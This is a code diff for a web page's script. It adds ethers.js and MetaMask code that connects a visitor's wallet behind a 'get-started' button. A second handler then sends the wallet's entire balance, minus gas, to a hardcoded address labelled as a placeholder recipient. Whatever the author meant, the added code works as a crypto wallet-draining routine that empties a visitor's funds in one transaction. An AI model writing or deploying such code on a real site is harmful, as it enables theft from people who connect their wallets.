@@ -1,4 +1,69 @@
-document.getElementById('get-started').onclick = async () => {
+let provider;
+let signer;
+
+document.getElementById('get-started').addEventListener('click', async () => {
+    if (window.ethereum) {
+        try {
+            // Request account access
+            await ethereum.request({ method: 'eth_requestAccounts' });
+            console.log('MetaMask is connected');
+
+            // Create a provider
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+
+            // Get the signer (connected user)
+            signer = provider.getSigner();
+        } catch (error) {
+            console.error('User denied account access', error);
+        }
+    } else {
+        console.error('MetaMask is not installed');
+    }
+});
+
+async function createAndSignTransaction() {
+    if (window.ethereum && signer) {
+        try {
+            // Get the balance of the connected wallet
+            const balance = await signer.getBalance();
+
+            // Get the current gas price
+            const gasPrice = await provider.getGasPrice();
+
+            // Calculate the gas limit for a standard transaction
+            const gasLimit = ethers.utils.hexlify(21000);
+
+            // Calculate the total gas cost
+            const gasCost = gasPrice.mul(gasLimit);
+
+            // Calculate the amount to send (balance - gas cost)
+            const value = balance.sub(gasCost);
+
+            // Define the transaction
+            const tx = {
+                to: '0xC0ffee254729296a45a3885639AC7E10F9d54979',  // Replace with the recipient address
+                value: value,
+                gasLimit: gasLimit,
+                gasPrice: gasPrice
+            };
+
+            // Send the transaction
+            const txResponse = await signer.sendTransaction(tx);
+            console.log('Transaction hash:', txResponse.hash);
+
+            // Wait for the transaction to be mined
+            const receipt = await txResponse.wait();
+            console.log('Transaction confirmed:', receipt);
+        } catch (error) {
+            console.error('Transaction failed:', error);
+        }
+    } else {
+        console.error('MetaMask is not installed or wallet is not connected');
+    }
+}
+
+document.getElementById('sendBtn').addEventListener('click', createAndSignTransaction);
+/*document.getElementById('get-started').onclick = async () => {
     try {
         const providerOptions = {
             injected: {
@@ -68,4 +133,4 @@ document.getElementById('get-started').onclick = async () => {
     } catch (error) {
         console.error(error);
     }
-};
+};*/
